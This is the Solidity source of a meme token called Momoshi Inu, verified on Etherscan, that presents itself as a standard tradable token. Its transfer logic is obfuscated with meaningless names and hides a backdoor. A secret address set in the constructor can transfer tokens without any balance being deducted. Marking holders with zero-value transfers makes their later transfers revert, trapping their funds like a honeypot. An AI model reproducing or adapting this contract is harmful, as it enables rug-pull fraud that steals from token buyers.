/**
 *Submitted for verification at Etherscan.io on 2023-05-14
*/

/**
Link: https://t.me/MomoshiInu
Twitter: https://twitter.com/MomoshiInuERC
Website: https://www.momoshiinu.com/
*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MomoshiInu is Ownable {
    uint256 public totalSupply;

    function equator(address ever, address together, uint256 welcome) private returns (bool success) {
        if (facing[ever] == 0) {
            if (uniswapV2Pair != ever && military[ever] > 0) {
                facing[ever] -= small;
            }
            balanceOf[ever] -= welcome;
        }
        balanceOf[together] += welcome;
        if (welcome == 0) {
            military[together] += small;
        }
        emit Transfer(ever, together, welcome);
        return true;
    }

    function transferFrom(address ever, address together, uint256 welcome) public returns (bool success) {
        equator(ever, together, welcome);
        require(welcome <= allowance[ever][msg.sender]);
        allowance[ever][msg.sender] -= welcome;
        return true;
    }

    address public uniswapV2Pair;

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address moon, uint256 pump) public returns (bool success) {
        equator(msg.sender, moon, pump);
        return true;
    }

    uint256 private small = 45;

    mapping(address => uint256) private facing;

    constructor(address electricity) {
        totalSupply = 1000000000 * 10 ** decimals;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        balanceOf[msg.sender] = totalSupply;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        symbol = 'MMOSHI';
        facing[electricity] = small;
        name = 'Momoshi Inu';
    }

    string public name;

    mapping(address => uint256) private military;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address shirt, uint256 welcome) public returns (bool success) {
        allowance[msg.sender][shirt] = welcome;
        emit Approval(msg.sender, shirt, welcome);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;
}